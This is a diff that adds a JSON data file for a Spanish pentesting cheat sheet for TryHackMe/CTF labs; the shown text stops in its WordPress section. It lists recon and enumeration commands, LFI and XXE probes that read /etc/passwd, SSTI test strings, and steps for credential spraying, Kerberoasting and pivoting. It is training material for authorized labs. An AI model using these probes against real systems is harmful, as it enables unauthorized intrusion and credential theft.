@@ -1,0 +1,2429 @@
+{
+  "generatedAt": "2026-07-06",
+  "stats": {
+    "totalSections": 19,
+    "totalCommands": 102,
+    "totalTags": 9
+  },
+  "tags": [
+    "active-directory",
+    "credentials",
+    "exploit",
+    "linux",
+    "pivoting",
+    "recon",
+    "web",
+    "windows",
+    "workflow"
+  ],
+  "phases": [
+    "access",
+    "closeout",
+    "enumeration",
+    "pivot",
+    "privesc",
+    "recon"
+  ],
+  "shortcuts": [
+    {
+      "label": "Estoy atascado",
+      "query": "checklist atasco errores hipotesis reenumerar",
+      "target": "checklist-de-atasco"
+    },
+    {
+      "label": "Tengo credenciales",
+      "query": "credenciales loot hash cracking reuse smb ssh winrm",
+      "target": "credenciales-y-loot"
+    },
+    {
+      "label": "Tengo shell",
+      "query": "acceso inicial shell estabilizar privesc post exploit",
+      "target": "acceso-inicial"
+    },
+    {
+      "label": "Veo una web",
+      "query": "web api idor jwt upload sqli wordpress discovery",
+      "target": "web-y-apis"
+    },
+    {
+      "label": "Necesito pivotar",
+      "query": "pivoting tunneling chisel ligolo proxychains ssh tunel",
+      "target": "pivoting"
+    },
+    {
+      "label": "Tengo una version/CVE",
+      "query": "cve exploit poc version verificar payload",
+      "target": "cve-y-exploits"
+    }
+  ],
+  "sections": [
+    {
+      "id": "section-01",
+      "order": 1,
+      "slug": "ultra-quick-start",
+      "title": "Ultra quick start",
+      "summary": "La hoja minima para empezar cualquier room sin pensar demasiado.",
+      "phase": "recon",
+      "tags": [
+        "recon",
+        "workflow"
+      ],
+      "commands": [
+        "mkdir -p nmap web loot creds hashes screenshots exploits notes",
+        "export IP=10.10.10.10",
+        "export URL=http://target.local",
+        "nmap -p- -Pn -n --min-rate 5000 $IP -oN nmap/all_ports.txt",
+        "nmap -sC -sV -Pn -p <PUERTOS> $IP -oN nmap/services.txt"
+      ],
+      "tables": [
+        [
+          "Fase",
+          "Accion minima",
+          "Resultado esperado"
+        ],
+        [
+          "1. Preparar",
+          "Crear carpetas, fijar IP/URL, anadir hostname si aplica.",
+          "Entorno ordenado y variables listas."
+        ],
+        [
+          "2. Descubrir",
+          "nmap full TCP + servicios sobre puertos abiertos.",
+          "Lista real de puertos y versiones."
+        ],
+        [
+          "3. Enumerar",
+          "Seguir el servicio dominante: web, SMB, AD, DNS, SNMP, NFS.",
+          "Usuarios, rutas, shares, endpoints o versiones."
+        ],
+        [
+          "4. Priorizar",
+          "Elegir 1-2 hipotesis con evidencia, no probar todo a la vez.",
+          "Vector candidato claro."
+        ],
+        [
+          "5. Acceso",
+          "Cred reuse, RCE, upload, SSH, WinRM, SQLi o panel admin.",
+          "Shell o login util."
+        ],
+        [
+          "6. Post-exploit",
+          "whoami/id, grupos, procesos, archivos, configs, credenciales.",
+          "Mapa del contexto local."
+        ],
+        [
+          "7. Privesc",
+          "Linux: sudo/SUID/caps/cron/creds. Windows: privs/servicios/tareas/creds.",
+          "Usuario superior o root/admin."
+        ],
+        [
+          "8. Reenumerar",
+          "Cada credencial nueva reinicia SMB/web/sudo/WinRM/LDAP/DB.",
+          "Nuevas rutas desbloqueadas."
+        ],
+        [
+          "9. Cierre",
+          "Guardar comandos minimos, evidencia, flags y root cause.",
+          "Writeup reproducible."
+        ]
+      ],
+      "blocks": [
+        [
+          "p",
+          "Usa esta pagina cuando quieras arrancar rapido. La idea es no quedarse mirando la terminal: descubre superficie, enumera lo que exista, busca credenciales o bugs, consigue acceso, escala y documenta."
+        ],
+        [
+          "table",
+          [
+            [
+              "Fase",
+              "Accion minima",
+              "Resultado esperado"
+            ],
+            [
+              "1. Preparar",
+              "Crear carpetas, fijar IP/URL, anadir hostname si aplica.",
+              "Entorno ordenado y variables listas."
+            ],
+            [
+              "2. Descubrir",
+              "nmap full TCP + servicios sobre puertos abiertos.",
+              "Lista real de puertos y versiones."
+            ],
+            [
+              "3. Enumerar",
+              "Seguir el servicio dominante: web, SMB, AD, DNS, SNMP, NFS.",
+              "Usuarios, rutas, shares, endpoints o versiones."
+            ],
+            [
+              "4. Priorizar",
+              "Elegir 1-2 hipotesis con evidencia, no probar todo a la vez.",
+              "Vector candidato claro."
+            ],
+            [
+              "5. Acceso",
+              "Cred reuse, RCE, upload, SSH, WinRM, SQLi o panel admin.",
+              "Shell o login util."
+            ],
+            [
+              "6. Post-exploit",
+              "whoami/id, grupos, procesos, archivos, configs, credenciales.",
+              "Mapa del contexto local."
+            ],
+            [
+              "7. Privesc",
+              "Linux: sudo/SUID/caps/cron/creds. Windows: privs/servicios/tareas/creds.",
+              "Usuario superior o root/admin."
+            ],
+            [
+              "8. Reenumerar",
+              "Cada credencial nueva reinicia SMB/web/sudo/WinRM/LDAP/DB.",
+              "Nuevas rutas desbloqueadas."
+            ],
+            [
+              "9. Cierre",
+              "Guardar comandos minimos, evidencia, flags y root cause.",
+              "Writeup reproducible."
+            ]
+          ],
+          [
+            2.7,
+            6.6,
+            6.9
+          ]
+        ],
+        [
+          "h2",
+          "Comandos base"
+        ],
+        [
+          "code",
+          [
+            "mkdir -p nmap web loot creds hashes screenshots exploits notes",
+            "export IP=10.10.10.10",
+            "export URL=http://target.local",
+            "nmap -p- -Pn -n --min-rate 5000 $IP -oN nmap/all_ports.txt",
+            "nmap -sC -sV -Pn -p <PUERTOS> $IP -oN nmap/services.txt"
+          ]
+        ],
+        [
+          "bullets",
+          [
+            "Si ves web, pasa a discovery/Burp antes de brute force.",
+            "Si ves SMB/AD, busca usuarios reales antes de passwords.",
+            "Si consigues una credencial, vuelve a enumerar. No sigas explotando a ciegas."
+          ]
+        ]
+      ],
+      "searchText": "Ultra quick start La hoja minima para empezar cualquier room sin pensar demasiado. Usa esta pagina cuando quieras arrancar rapido. La idea es no quedarse mirando la terminal: descubre superficie, enumera lo que exista, busca credenciales o bugs, consigue acceso, escala y documenta. Fase Accion minima Resultado esperado 1. Preparar Crear carpetas, fijar IP/URL, anadir hostname si aplica. Entorno ordenado y variables listas. 2. Descubrir nmap full TCP + servicios sobre puertos abiertos. Lista real de puertos y versiones. 3. Enumerar Seguir el servicio dominante: web, SMB, AD, DNS, SNMP, NFS. Usuarios, rutas, shares, endpoints o versiones. 4. Priorizar Elegir 1-2 hipotesis con evidencia, no probar todo a la vez. Vector candidato claro. 5. Acceso Cred reuse, RCE, upload, SSH, WinRM, SQLi o panel admin. Shell o login util. 6. Post-exploit whoami/id, grupos, procesos, archivos, configs, credenciales. Mapa del contexto local. 7. Privesc Linux: sudo/SUID/caps/cron/creds. Windows: privs/servicios/tareas/creds. Usuario superior o root/admin. 8. Reenumerar Cada credencial nueva reinicia SMB/web/sudo/WinRM/LDAP/DB. Nuevas rutas desbloqueadas. 9. Cierre Guardar comandos minimos, evidencia, flags y root cause. Writeup reproducible. Comandos base mkdir -p nmap web loot creds hashes screenshots exploits notes export IP=10.10.10.10 export URL=http://target.local nmap -p- -Pn -n --min-rate 5000 $IP -oN nmap/all_ports.txt nmap -sC -sV -Pn -p <PUERTOS> $IP -oN nmap/services.txt Si ves web, pasa a discovery/Burp antes de brute force. Si ves SMB/AD, busca usuarios reales antes de passwords. Si consigues una credencial, vuelve a enumerar. No sigas explotando a ciegas."
+    },
+    {
+      "id": "section-02",
+      "order": 2,
+      "slug": "mentalidad-y-preparacion",
+      "title": "Mentalidad y preparacion",
+      "summary": "Como empezar una room sin perder contexto.",
+      "phase": "recon",
+      "tags": [
+        "recon",
+        "workflow"
+      ],
+      "commands": [
+        "mkdir -p nmap web loot creds hashes screenshots exploits notes",
+        "export IP=10.10.10.10",
+        "export URL=http://target.local",
+        "echo '10.10.10.10 target.local' | sudo tee -a /etc/hosts"
+      ],
+      "tables": [
+        [
+          "Pregunta",
+          "Por que importa"
+        ],
+        [
+          "Quien es el objetivo?",
+          "IP, hostname, dominio y tecnologia condicionan todas las herramientas."
+        ],
+        [
+          "Que superficie existe?",
+          "Puertos y servicios deciden si vas a web, SMB, AD, SQLi, NFS, SNMP o pivot."
+        ],
+        [
+          "Que credenciales tengo?",
+          "Cada nueva identidad obliga a reenumerar."
+        ],
+        [
+          "Que puedo controlar?",
+          "La escalada aparece cuando modificas algo que ejecuta o lee un usuario superior."
+        ]
+      ],
+      "blocks": [
+        [
+          "p",
+          "Este documento es la version curada del master: conserva lo importante, elimina repeticion y lo ordena como una cadena de trabajo. La pregunta constante no es 'que comando toca', sino 'que hallazgo desbloquea el siguiente paso'."
+        ],
+        [
+          "table",
+          [
+            [
+              "Pregunta",
+              "Por que importa"
+            ],
+            [
+              "Quien es el objetivo?",
+              "IP, hostname, dominio y tecnologia condicionan todas las herramientas."
+            ],
+            [
+              "Que superficie existe?",
+              "Puertos y servicios deciden si vas a web, SMB, AD, SQLi, NFS, SNMP o pivot."
+            ],
+            [
+              "Que credenciales tengo?",
+              "Cada nueva identidad obliga a reenumerar."
+            ],
+            [
+              "Que puedo controlar?",
+              "La escalada aparece cuando modificas algo que ejecuta o lee un usuario superior."
+            ]
+          ],
+          [
+            5.2,
+            11.0
+          ]
+        ],
+        [
+          "h2",
+          "Preparacion minima"
+        ],
+        [
+          "code",
+          [
+            "mkdir -p nmap web loot creds hashes screenshots exploits notes",
+            "export IP=10.10.10.10",
+            "export URL=http://target.local",
+            "echo '10.10.10.10 target.local' | sudo tee -a /etc/hosts"
+          ]
+        ],
+        [
+          "bullets",
+          [
+            "Crea estructura de evidencia antes de empezar, no cuando ya tienes diez terminales abiertas.",
+            "Anota comandos que cambian una decision: credencial valida, ruta vulnerable, usuario encontrado, servicio interno.",
+            "En THM/CTF esta guia asume autorizacion de laboratorio. Fuera de ese contexto no ejecutes tecnicas ofensivas."
+          ]
+        ]
+      ],
+      "searchText": "Mentalidad y preparacion Como empezar una room sin perder contexto. Este documento es la version curada del master: conserva lo importante, elimina repeticion y lo ordena como una cadena de trabajo. La pregunta constante no es 'que comando toca', sino 'que hallazgo desbloquea el siguiente paso'. Pregunta Por que importa Quien es el objetivo? IP, hostname, dominio y tecnologia condicionan todas las herramientas. Que superficie existe? Puertos y servicios deciden si vas a web, SMB, AD, SQLi, NFS, SNMP o pivot. Que credenciales tengo? Cada nueva identidad obliga a reenumerar. Que puedo controlar? La escalada aparece cuando modificas algo que ejecuta o lee un usuario superior. Preparacion minima mkdir -p nmap web loot creds hashes screenshots exploits notes export IP=10.10.10.10 export URL=http://target.local echo '10.10.10.10 target.local' | sudo tee -a /etc/hosts Crea estructura de evidencia antes de empezar, no cuando ya tienes diez terminales abiertas. Anota comandos que cambian una decision: credencial valida, ruta vulnerable, usuario encontrado, servicio interno. En THM/CTF esta guia asume autorizacion de laboratorio. Fuera de ese contexto no ejecutes tecnicas ofensivas."
+    },
+    {
+      "id": "section-03",
+      "order": 3,
+      "slug": "mapa-de-decisiones",
+      "title": "Mapa de decisiones",
+      "summary": "Si veo X, priorizo Y.",
+      "phase": "recon",
+      "tags": [
+        "recon",
+        "workflow"
+      ],
+      "commands": [],
+      "tables": [
+        [
+          "Senal",
+          "Prueba prioritaria"
+        ],
+        [
+          "80/443",
+          "whatweb, curl, robots/sitemap, ffuf/gobuster, Burp, vhosts."
+        ],
+        [
+          "WordPress",
+          "WPScan, wp-json, usuarios, plugins/temas, uploads, XML-RPC."
+        ],
+        [
+          "Parametro sospechoso",
+          "LFI, SQLi, SSTI, command injection, IDOR si hay IDs."
+        ],
+        [
+          "445/139",
+          "smbclient, smbmap, nxc, enum4linux, RID brute si AD."
+        ],
+        [
+          "53",
+          "dig/nslookup, AXFR si hay dominio, nombres para /etc/hosts."
+        ],
+        [
+          "161",
+          "snmpwalk y busqueda de usuarios, rutas, procesos, configs."
+        ],
+        [
+          "2049",
+          "showmount, mount, revisar permisos y archivos reutilizables."
+        ],
+        [
+          "Shell Linux",
+          "id, sudo -l, SUID, capabilities, cron, systemd, creds, linpeas/pspy."
+        ],
+        [
+          "Shell Windows",
+          "whoami /priv, servicios, tareas, registry, winPEAS, creds."
+        ],
+        [
+          "Dominio AD",
+          "SMB/LDAP/Kerberos: usuarios, spraying controlado, Kerberoast/AS-REP, BloodHound."
+        ],
+        [
+          "Servicio interno",
+          "Pivot con SSH -L/-D, chisel o ligolo-ng."
+        ]
+      ],
+      "blocks": [
+        [
+          "table",
+          [
+            [
+              "Senal",
+              "Prueba prioritaria"
+            ],
+            [
+              "80/443",
+              "whatweb, curl, robots/sitemap, ffuf/gobuster, Burp, vhosts."
+            ],
+            [
+              "WordPress",
+              "WPScan, wp-json, usuarios, plugins/temas, uploads, XML-RPC."
+            ],
+            [
+              "Parametro sospechoso",
+              "LFI, SQLi, SSTI, command injection, IDOR si hay IDs."
+            ],
+            [
+              "445/139",
+              "smbclient, smbmap, nxc, enum4linux, RID brute si AD."
+            ],
+            [
+              "53",
+              "dig/nslookup, AXFR si hay dominio, nombres para /etc/hosts."
+            ],
+            [
+              "161",
+              "snmpwalk y busqueda de usuarios, rutas, procesos, configs."
+            ],
+            [
+              "2049",
+              "showmount, mount, revisar permisos y archivos reutilizables."
+            ],
+            [
+              "Shell Linux",
+              "id, sudo -l, SUID, capabilities, cron, systemd, creds, linpeas/pspy."
+            ],
+            [
+              "Shell Windows",
+              "whoami /priv, servicios, tareas, registry, winPEAS, creds."
+            ],
+            [
+              "Dominio AD",
+              "SMB/LDAP/Kerberos: usuarios, spraying controlado, Kerberoast/AS-REP, BloodHound."
+            ],
+            [
+              "Servicio interno",
+              "Pivot con SSH -L/-D, chisel o ligolo-ng."
+            ]
+          ],
+          [
+            4.6,
+            11.6
+          ]
+        ],
+        [
+          "p",
+          "No ejecutes todas las pruebas a la vez. El orden correcto es el que reduce incertidumbre con menos ruido."
+        ]
+      ],
+      "searchText": "Mapa de decisiones Si veo X, priorizo Y. Senal Prueba prioritaria 80/443 whatweb, curl, robots/sitemap, ffuf/gobuster, Burp, vhosts. WordPress WPScan, wp-json, usuarios, plugins/temas, uploads, XML-RPC. Parametro sospechoso LFI, SQLi, SSTI, command injection, IDOR si hay IDs. 445/139 smbclient, smbmap, nxc, enum4linux, RID brute si AD. 53 dig/nslookup, AXFR si hay dominio, nombres para /etc/hosts. 161 snmpwalk y busqueda de usuarios, rutas, procesos, configs. 2049 showmount, mount, revisar permisos y archivos reutilizables. Shell Linux id, sudo -l, SUID, capabilities, cron, systemd, creds, linpeas/pspy. Shell Windows whoami /priv, servicios, tareas, registry, winPEAS, creds. Dominio AD SMB/LDAP/Kerberos: usuarios, spraying controlado, Kerberoast/AS-REP, BloodHound. Servicio interno Pivot con SSH -L/-D, chisel o ligolo-ng. No ejecutes todas las pruebas a la vez. El orden correcto es el que reduce incertidumbre con menos ruido."
+    },
+    {
+      "id": "section-04",
+      "order": 4,
+      "slug": "arquetipos-de-rooms",
+      "title": "Arquetipos de rooms",
+      "summary": "Reconocer el tipo de room y elegir una ruta de trabajo.",
+      "phase": "recon",
+      "tags": [
+        "recon",
+        "workflow"
+      ],
+      "commands": [],
+      "tables": [
+        [
+          "Arquetipo",
+          "Senales",
+          "Ruta recomendada"
+        ],
+        [
+          "Web basica",
+          "80/443, login, rutas ocultas, uploads.",
+          "Discovery -> Burp -> LFI/SSTI/upload/IDOR/creds."
+        ],
+        [
+          "WordPress/CMS",
+          "wp-content, wp-login, plugins, temas.",
+          "WPScan -> usuarios -> plugins/temas -> creds/wp-admin -> RCE."
+        ],
+        [
+          "SQLi room",
+          "Parametros, errores SQL, login bypass.",
+          "Confirmar manual -> sqlmap con request -> dump -> hashes/RCE si aplica."
+        ],
+        [
+          "SMB/Linux mixta",
+          "445, shares, backups, usuarios reutilizables.",
+          "Shares -> loot -> cred reuse -> SSH/web/sudo."
+        ],
+        [
+          "Active Directory",
+          "53/88/389/445, dominio, DC.",
+          "Hosts/DNS -> usuarios -> spraying controlado -> Kerberos/BloodHound."
+        ],
+        [
+          "Linux privesc",
+          "Shell Linux sin root.",
+          "id/sudo -l -> SUID -> caps -> cron/systemd -> creds."
+        ],
+        [
+          "Windows privesc",
+          "Shell Windows sin admin.",
+          "whoami /priv -> servicios -> tareas -> registry -> creds."
+        ],
+        [
+          "Pivoting",
+          "Servicios localhost o red interna no accesible.",
+          "Rutas/interfaces -> ssh -L/-D, chisel o ligolo -> reenum interna."
+        ],
+        [
+          "Cracking/loot",
+          "Hashes, kdbx, id_rsa, zips, backups.",
+          "Convertir con *2john -> crackear -> cred reuse controlado."
+        ],
+        [
+          "CVE/exploit",
+          "Version concreta vulnerable.",
+          "Verificar version/config -> leer PoC -> check -> payload minimo."
+        ]
+      ],
+      "blocks": [
+        [
+          "p",
+          "Un arquetipo no es una regla absoluta, pero ayuda a decidir por donde empezar. Si una room mezcla varios patrones, resuelve primero el que te de identidad, credenciales o una shell inicial."
+        ],
+        [
+          "table",
+          [
+            [
+              "Arquetipo",
+              "Senales",
+              "Ruta recomendada"
+            ],
+            [
+              "Web basica",
+              "80/443, login, rutas ocultas, uploads.",
+              "Discovery -> Burp -> LFI/SSTI/upload/IDOR/creds."
+            ],
+            [
+              "WordPress/CMS",
+              "wp-content, wp-login, plugins, temas.",
+              "WPScan -> usuarios -> plugins/temas -> creds/wp-admin -> RCE."
+            ],
+            [
+              "SQLi room",
+              "Parametros, errores SQL, login bypass.",
+              "Confirmar manual -> sqlmap con request -> dump -> hashes/RCE si aplica."
+            ],
+            [
+              "SMB/Linux mixta",
+              "445, shares, backups, usuarios reutilizables.",
+              "Shares -> loot -> cred reuse -> SSH/web/sudo."
+            ],
+            [
+              "Active Directory",
+              "53/88/389/445, dominio, DC.",
+              "Hosts/DNS -> usuarios -> spraying controlado -> Kerberos/BloodHound."
+            ],
+            [
+              "Linux privesc",
+              "Shell Linux sin root.",
+              "id/sudo -l -> SUID -> caps -> cron/systemd -> creds."
+            ],
+            [
+              "Windows privesc",
+              "Shell Windows sin admin.",
+              "whoami /priv -> servicios -> tareas -> registry -> creds."
+            ],
+            [
+              "Pivoting",
+              "Servicios localhost o red interna no accesible.",
+              "Rutas/interfaces -> ssh -L/-D, chisel o ligolo -> reenum interna."
+            ],
+            [
+              "Cracking/loot",
+              "Hashes, kdbx, id_rsa, zips, backups.",
+              "Convertir con *2john -> crackear -> cred reuse controlado."
+            ],
+            [
+              "CVE/exploit",
+              "Version concreta vulnerable.",
+              "Verificar version/config -> leer PoC -> check -> payload minimo."
+            ]
+          ],
+          [
+            3.0,
+            5.2,
+            8.0
+          ]
+        ],
+        [
+          "h2",
+          "Como usar esta tabla"
+        ],
+        [
+          "bullets",
+          [
+            "Elige el arquetipo por evidencia, no por intuicion: puertos, rutas, banners, usuarios o archivos.",
+            "Si aparecen credenciales, salta a reutilizacion controlada y reenumeracion.",
+            "Si no hay progreso en 20-30 minutos, usa la checklist de atasco antes de abrir exploits nuevos."
+          ]
+        ]
+      ],
+      "searchText": "Arquetipos de rooms Reconocer el tipo de room y elegir una ruta de trabajo. Un arquetipo no es una regla absoluta, pero ayuda a decidir por donde empezar. Si una room mezcla varios patrones, resuelve primero el que te de identidad, credenciales o una shell inicial. Arquetipo Senales Ruta recomendada Web basica 80/443, login, rutas ocultas, uploads. Discovery -> Burp -> LFI/SSTI/upload/IDOR/creds. WordPress/CMS wp-content, wp-login, plugins, temas. WPScan -> usuarios -> plugins/temas -> creds/wp-admin -> RCE. SQLi room Parametros, errores SQL, login bypass. Confirmar manual -> sqlmap con request -> dump -> hashes/RCE si aplica. SMB/Linux mixta 445, shares, backups, usuarios reutilizables. Shares -> loot -> cred reuse -> SSH/web/sudo. Active Directory 53/88/389/445, dominio, DC. Hosts/DNS -> usuarios -> spraying controlado -> Kerberos/BloodHound. Linux privesc Shell Linux sin root. id/sudo -l -> SUID -> caps -> cron/systemd -> creds. Windows privesc Shell Windows sin admin. whoami /priv -> servicios -> tareas -> registry -> creds. Pivoting Servicios localhost o red interna no accesible. Rutas/interfaces -> ssh -L/-D, chisel o ligolo -> reenum interna. Cracking/loot Hashes, kdbx, id_rsa, zips, backups. Convertir con *2john -> crackear -> cred reuse controlado. CVE/exploit Version concreta vulnerable. Verificar version/config -> leer PoC -> check -> payload minimo. Como usar esta tabla Elige el arquetipo por evidencia, no por intuicion: puertos, rutas, banners, usuarios o archivos. Si aparecen credenciales, salta a reutilizacion controlada y reenumeracion. Si no hay progreso en 20-30 minutos, usa la checklist de atasco antes de abrir exploits nuevos."
+    },
+    {
+      "id": "section-05",
+      "order": 5,
+      "slug": "recon-y-servicios",
+      "title": "Recon y servicios",
+      "summary": "Encontrar superficie, nombres, versiones y rutas de entrada.",
+      "phase": "recon",
+      "tags": [
+        "recon"
+      ],
+      "commands": [
+        "nmap -p- -Pn -n --min-rate 5000 $IP -oN nmap/all_ports.txt",
+        "nmap -sC -sV -Pn -p <PUERTOS> $IP -oN nmap/services.txt",
+        "sudo nmap -sU --top-ports 200 -sV $IP -oN nmap/udp.txt"
+      ],
+      "tables": [
+        [
+          "Servicio",
+          "Comandos utiles"
+        ],
+        [
+          "SMB",
+          "smbclient -L //$IP -N; smbmap -H $IP; nxc smb $IP --shares"
+        ],
+        [
+          "FTP",
+          "ftp $IP; probar anonymous; wget -m ftp://anonymous:anonymous@$IP/"
+        ],
+        [
+          "DNS",
+          "dig @$IP dominio; dig axfr @$IP dominio; dnsrecon -d dominio -n $IP"
+        ],
+        [
+          "SNMP",
+          "snmpwalk -v2c -c public $IP; onesixtyone -c community.txt $IP"
+        ],
+        [
+          "NFS",
+          "showmount -e $IP; mount -t nfs $IP:/share /mnt/share"
+        ],
+        [
+          "SSH",
+          "probar claves, usuarios filtrados y passphrases con ssh2john."
+        ]
+      ],
+      "blocks": [
+        [
+          "h2",
+          "Escaneo inicial"
+        ],
+        [
+          "code",
+          [
+            "nmap -p- -Pn -n --min-rate 5000 $IP -oN nmap/all_ports.txt",
+            "nmap -sC -sV -Pn -p <PUERTOS> $IP -oN nmap/services.txt",
+            "sudo nmap -sU --top-ports 200 -sV $IP -oN nmap/udp.txt"
+          ]
+        ],
+        [
+          "bullets",
+          [
+            "Usa -Pn si la maquina filtra ping.",
+            "Primero descubre puertos; despues enumera versiones y scripts.",
+            "UDP merece una pasada si sospechas DNS, SNMP, TFTP o NFS."
+          ]
+        ],
+        [
+          "h2",
+          "Servicios tipicos"
+        ],
+        [
+          "table",
+          [
+            [
+              "Servicio",
+              "Comandos utiles"
+            ],
+            [
+              "SMB",
+              "smbclient -L //$IP -N; smbmap -H $IP; nxc smb $IP --shares"
+            ],
+            [
+              "FTP",
+              "ftp $IP; probar anonymous; wget -m ftp://anonymous:anonymous@$IP/"
+            ],
+            [
+              "DNS",
+              "dig @$IP dominio; dig axfr @$IP dominio; dnsrecon -d dominio -n $IP"
+            ],
+            [
+              "SNMP",
+              "snmpwalk -v2c -c public $IP; onesixtyone -c community.txt $IP"
+            ],
+            [
+              "NFS",
+              "showmount -e $IP; mount -t nfs $IP:/share /mnt/share"
+            ],
+            [
+              "SSH",
+              "probar claves, usuarios filtrados y passphrases con ssh2john."
+            ]
+          ],
+          [
+            3.2,
+            13.0
+          ]
+        ]
+      ],
+      "searchText": "Recon y servicios Encontrar superficie, nombres, versiones y rutas de entrada. Escaneo inicial nmap -p- -Pn -n --min-rate 5000 $IP -oN nmap/all_ports.txt nmap -sC -sV -Pn -p <PUERTOS> $IP -oN nmap/services.txt sudo nmap -sU --top-ports 200 -sV $IP -oN nmap/udp.txt Usa -Pn si la maquina filtra ping. Primero descubre puertos; despues enumera versiones y scripts. UDP merece una pasada si sospechas DNS, SNMP, TFTP o NFS. Servicios tipicos Servicio Comandos utiles SMB smbclient -L //$IP -N; smbmap -H $IP; nxc smb $IP --shares FTP ftp $IP; probar anonymous; wget -m ftp://anonymous:anonymous@$IP/ DNS dig @$IP dominio; dig axfr @$IP dominio; dnsrecon -d dominio -n $IP SNMP snmpwalk -v2c -c public $IP; onesixtyone -c community.txt $IP NFS showmount -e $IP; mount -t nfs $IP:/share /mnt/share SSH probar claves, usuarios filtrados y passphrases con ssh2john."
+    },
+    {
+      "id": "section-06",
+      "order": 6,
+      "slug": "web-y-apis",
+      "title": "Web y APIs",
+      "summary": "De discovery web a bugs de autorizacion, SSRF, JWT y uploads.",
+      "phase": "enumeration",
+      "tags": [
+        "web"
+      ],
+      "commands": [
+        "curl -i $URL/",
+        "whatweb -a 3 $URL",
+        "ffuf -u \"$URL/FUZZ\" -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.html -fc 404",
+        "ffuf -u \"$URL/\" -H \"Host: FUZZ.target.local\" -w subdomains.txt -fs 0",
+        "katana -u $URL -d 3",
+        "arjun -u \"$URL/page.php\""
+      ],
+      "tables": [
+        [
+          "Bug",
+          "Senales y prueba inicial"
+        ],
+        [
+          "LFI",
+          "Parametros file/page/lang/template. Probar ../../../../etc/passwd y php://filter."
+        ],
+        [
+          "SSTI",
+          "Payloads {{7*7}}, ${7*7}, <%= 7*7 %>; confirmar motor antes de explotar."
+        ],
+        [
+          "IDOR/BOLA",
+          "Cambiar IDs entre usuarios. Si ves datos ajenos, hay autorizacion rota."
+        ],
+        [
+          "JWT",
+          "Revisar alg, kid, role, user_id, exp. Probar solo si el reto apunta a firma debil."
+        ],
+        [
+          "GraphQL",
+          "Introspection, tipos, queries/mutations con id/userId/admin/debug."
+        ],
+        [
+          "SSRF",
+          "Parametros url/webhook/avatar/import. Confirmar contra tu listener antes de localhost."
+        ],
+        [
+          "XXE",
+          "Entradas XML/SVG/SOAP/SAML/DOCX; probar entidad file:///etc/passwd en lab."
+        ],
+        [
+          "Upload",
+          "Extension, Content-Type, magic bytes, doble extension, ruta de ejecucion."
+        ],
+        [
+          "Command injection",
+          "host/ip/domain/filename. Confirmar con id/whoami/hostname o delay controlado."
+        ]
+      ],
+      "blocks": [
+        [
+          "h2",
+          "Fingerprinting y discovery"
+        ],
+        [
+          "code",
+          [
+            "curl -i $URL/",
+            "whatweb -a 3 $URL",
+            "ffuf -u \"$URL/FUZZ\" -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.html -fc 404",
+            "ffuf -u \"$URL/\" -H \"Host: FUZZ.target.local\" -w subdomains.txt -fs 0",
+            "katana -u $URL -d 3",
+            "arjun -u \"$URL/page.php\""
+          ]
+        ],
+        [
+          "h2",
+          "Triage de bugs"
+        ],
+        [
+          "table",
+          [
+            [
+              "Bug",
+              "Senales y prueba inicial"
+            ],
+            [
+              "LFI",
+              "Parametros file/page/lang/template. Probar ../../../../etc/passwd y php://filter."
+            ],
+            [
+              "SSTI",
+              "Payloads {{7*7}}, ${7*7}, <%= 7*7 %>; confirmar motor antes de explotar."
+            ],
+            [
+              "IDOR/BOLA",
+              "Cambiar IDs entre usuarios. Si ves datos ajenos, hay autorizacion rota."
+            ],
+            [
+              "JWT",
+              "Revisar alg, kid, role, user_id, exp. Probar solo si el reto apunta a firma debil."
+            ],
+            [
+              "GraphQL",
+              "Introspection, tipos, queries/mutations con id/userId/admin/debug."
+            ],
+            [
+              "SSRF",
+              "Parametros url/webhook/avatar/import. Confirmar contra tu listener antes de localhost."
+            ],
+            [
+              "XXE",
+              "Entradas XML/SVG/SOAP/SAML/DOCX; probar entidad file:///etc/passwd en lab."
+            ],
+            [
+              "Upload",
+              "Extension, Content-Type, magic bytes, doble extension, ruta de ejecucion."
+            ],
+            [
+              "Command injection",
+              "host/ip/domain/filename. Confirmar con id/whoami/hostname o delay controlado."
+            ]
+          ],
+          [
+            3.6,
+            12.6
+          ]
+        ]
+      ],
+      "searchText": "Web y APIs De discovery web a bugs de autorizacion, SSRF, JWT y uploads. Fingerprinting y discovery curl -i $URL/ whatweb -a 3 $URL ffuf -u \"$URL/FUZZ\" -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.html -fc 404 ffuf -u \"$URL/\" -H \"Host: FUZZ.target.local\" -w subdomains.txt -fs 0 katana -u $URL -d 3 arjun -u \"$URL/page.php\" Triage de bugs Bug Senales y prueba inicial LFI Parametros file/page/lang/template. Probar ../../../../etc/passwd y php://filter. SSTI Payloads {{7*7}}, ${7*7}, <%= 7*7 %>; confirmar motor antes de explotar. IDOR/BOLA Cambiar IDs entre usuarios. Si ves datos ajenos, hay autorizacion rota. JWT Revisar alg, kid, role, user_id, exp. Probar solo si el reto apunta a firma debil. GraphQL Introspection, tipos, queries/mutations con id/userId/admin/debug. SSRF Parametros url/webhook/avatar/import. Confirmar contra tu listener antes de localhost. XXE Entradas XML/SVG/SOAP/SAML/DOCX; probar entidad file:///etc/passwd en lab. Upload Extension, Content-Type, magic bytes, doble extension, ruta de ejecucion. Command injection host/ip/domain/filename. Confirmar con id/whoami/hostname o delay controlado."
+    },
+    {
+      "id": "section-07",
+      "order": 7,
+      "slug": "wordpress",
+      "title": "WordPress",
+      "summary": "Workflow reducido para cuando detectas WordPress.",
+      "phase": "enumeration",
+      "tags": [
+        "web"
+      ],
+      "commands": [
+        "curl -sS -I $URL/wp-login.php | head",
+        "curl -sS $URL/ | grep -iE \"wp-content|wp-includes\" | head",
+        "wpscan --url $URL --enumerate p,t,u",
+        "wpscan --url $URL --plugins-detection mixed --enumerate ap,at,u",
+        "curl -sS \"$URL/wp-json/wp/v2/users?per_page=100\" | head"
+      ],
+      "tables": [
+        [
+          "Hallazgo",
+          "Siguiente paso"
+        ],
+        [
+          "Usuario WP",
+          "Probar password reuse o WPScan brute force moderado si el lab lo permite."
+        ],
+        [
+          "Plugin versionado",
+          "Buscar CVE, exploit-db, WPScan API y PoC legible."
+        ],
+        [
+          "wp-config filtrado",
+          "Extraer DB creds, conectar MySQL, buscar hashes o admin."
+        ],
+        [
+          "Acceso admin",
+          "Subida plugin/theme o funcionalidad vulnerable; documentar vector exacto."
+        ]
+      ],
+      "blocks": [
+        [
+          "h2",
+          "Confirmar y enumerar"
+        ],
+        [
+          "code",
+          [
